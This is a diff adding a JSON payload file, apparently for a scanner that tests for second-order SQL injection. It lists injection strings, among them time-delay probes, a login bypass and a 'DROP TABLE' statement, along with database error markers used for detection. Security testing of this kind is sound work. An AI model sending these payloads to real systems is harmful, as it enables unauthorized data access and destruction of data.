@@ -1,0 +1,11 @@
+{
+  "variants": {
+    "second_order": ["' OR '1'='1", "'; WAITFOR DELAY '0:0:3'-- -", "' AND SLEEP(3)-- -", "1; DROP TABLE temp-- -", "' UNION SELECT NULL-- -", "admin'-- -"]
+  },
+  "payloads": ["' OR '1'='1", "'; WAITFOR DELAY '0:0:3'-- -", "' AND SLEEP(3)-- -", "1; DROP TABLE temp-- -"],
+  "markers": ["sql syntax error", "you have an error in your sql syntax", "mysql_fetch", "ORA-", "SQLSTATE", "Unclosed quotation mark"],
+  "metadata": {
+    "cwe": "CWE-89",
+    "technique": "Second-order SQL injection"
+  }
+}
